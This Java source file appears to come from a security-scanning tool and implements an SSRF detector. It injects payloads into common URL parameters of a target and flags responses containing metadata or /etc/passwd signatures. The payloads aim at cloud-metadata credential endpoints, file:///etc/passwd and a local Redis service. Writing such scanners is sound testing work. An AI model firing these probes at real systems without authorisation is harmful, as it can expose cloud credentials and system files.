package it.r2u.anibus.service.analysis;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.function.DoubleConsumer;

/**
 * SSRF (Server-Side Request Forgery) detector.
 * Injects URL-shaped payloads into parameters and checks for out-of-band triggers
 * or direct response leaks (e.g. internal metadata content).
 */
public class SsrfDetector {

    private static final int TIMEOUT = 7000;

    private static final List<String> SSRF_PAYLOADS = List.of(
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",   // Alibaba Cloud IMDS
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://localtest.me/",
        "file:///etc/passwd",
        "dict://localhost:6379/info"
    );

    /** Parameter names commonly vulnerable to SSRF. */
    private static final List<String> SSRF_PARAMS = List.of(
        "url", "redirect", "uri", "link", "src", "source", "target",
        "dest", "destination", "callback", "return", "next", "continue",
        "goto", "image", "img", "proxy", "fetch", "load", "open"
    );

    /** Patterns in response body suggesting cloud metadata content. */
    private static final List<String> METADATA_SIGNATURES = List.of(
        "ami-id", "instance-id", "security-credentials",
        "computeMetadata", "local-ipv4", "local-hostname",
        "public-keys", "placement", "iam", "meta-data",
        "root:x:0:0", "daemon:x:", "/bin/bash"
    );

    public record SsrfResult(
        String url,
        String parameter,
        String payload,
        boolean potentiallyVulnerable,
        String evidence
    ) {
        public String risk() { return potentiallyVulnerable ? "HIGH" : "NONE"; }
    }

    /**
     * Probes the target URL for SSRF vulnerabilities in common parameters.
     *
     * @param targetUrl Base URL to probe
     * @param progress  0.0–1.0 progress callback
     * @return List of findings (only potentiallyVulnerable=true items are of interest)
     */
    public List<SsrfResult> scan(String targetUrl, DoubleConsumer progress) {
        List<SsrfResult> findings = new ArrayList<>();
        if (targetUrl == null || targetUrl.isBlank()) return findings;

        int total = SSRF_PARAMS.size() * SSRF_PAYLOADS.size();
        int done = 0;

        for (String param : SSRF_PARAMS) {
            for (String payload : SSRF_PAYLOADS) {
                SsrfResult r = probe(targetUrl, param, payload);
                if (r != null && r.potentiallyVulnerable()) findings.add(r);
                done++;
                if (progress != null) progress.accept((double) done / total);
            }
        }
        return findings;
    }

    private SsrfResult probe(String targetUrl, String param, String payload) {
        try {
            String encoded = URLEncoder.encode(payload, StandardCharsets.UTF_8);
            String sep  = targetUrl.contains("?") ? "&" : "?";
            String probeUrl = targetUrl + sep + param + "=" + encoded;

            HttpURLConnection conn = (HttpURLConnection) URI.create(probeUrl).toURL().openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(TIMEOUT);
            conn.setReadTimeout(TIMEOUT);
            conn.setInstanceFollowRedirects(false);
            conn.connect();

            conn.getResponseCode(); // trigger the request
            String body = "";
            try {
                body = new String(conn.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            } catch (IOException ignored) { }
            conn.disconnect();

            // Redirect to internal host = classic SSRF
            String location = conn.getHeaderField("Location");
            if (location != null && (location.contains("169.254") || location.contains("localhost")
                    || location.contains("127.0.0.1"))) {
                return new SsrfResult(probeUrl, param, payload, true,
                    "Redirect to internal host: " + location);
            }

            // Check body for cloud metadata signatures
            for (String sig : METADATA_SIGNATURES) {
                if (body.contains(sig)) {
                    String evidence = extractWindow(body, sig, 120);
                    return new SsrfResult(probeUrl, param, payload, true,
                        "Metadata signature '" + sig + "' in response: " + evidence);
                }
            }
        } catch (IOException | IllegalArgumentException ignored) { }
        return null;
    }

    private String extractWindow(String text, String needle, int window) {
        int idx = text.indexOf(needle);
        if (idx < 0) return "";
        int start = Math.max(0, idx - window / 2);
        int end   = Math.min(text.length(), idx + needle.length() + window / 2);
        return "…" + text.substring(start, end).replaceAll("\\s+", " ").trim() + "…";
    }

    public static String formatReport(List<SsrfResult> results, String targetUrl) {
        StringBuilder sb = new StringBuilder("=== SSRF SCAN: ").append(targetUrl).append(" ===\n");
        if (results == null || results.isEmpty()) {
            sb.append("  No SSRF indicators detected.\n");
            return sb.toString();
        }
        sb.append("  ").append(results.size()).append(" potential SSRF finding(s):\n");
        for (SsrfResult r : results) {
            sb.append("\n  [").append(r.risk()).append("] param=").append(r.parameter()).append("\n");
            sb.append("    payload : ").append(r.payload()).append("\n");
            sb.append("    evidence: ").append(r.evidence()).append("\n");
        }
        return sb.toString();
    }
}
